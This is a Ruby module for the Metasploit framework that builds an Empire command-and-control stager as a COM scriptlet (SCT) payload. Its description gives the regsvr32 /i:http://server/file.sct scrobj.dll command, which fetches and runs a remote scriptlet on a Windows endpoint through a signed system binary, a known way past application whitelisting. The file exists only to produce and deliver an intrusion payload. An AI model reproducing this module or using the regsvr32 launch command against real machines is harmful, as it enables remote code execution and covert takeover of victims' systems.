##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
                     'Description'=> 'Creates a SCT (COM Scriptlet) Payload for Empire, on the endpoint simply launch regsvr32 /u /n /s /i:http:http://server/file.sct scrobj.dll'
    ))
  end

  def stagerGenerator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_sct')
    return @stagerCode
  end
end
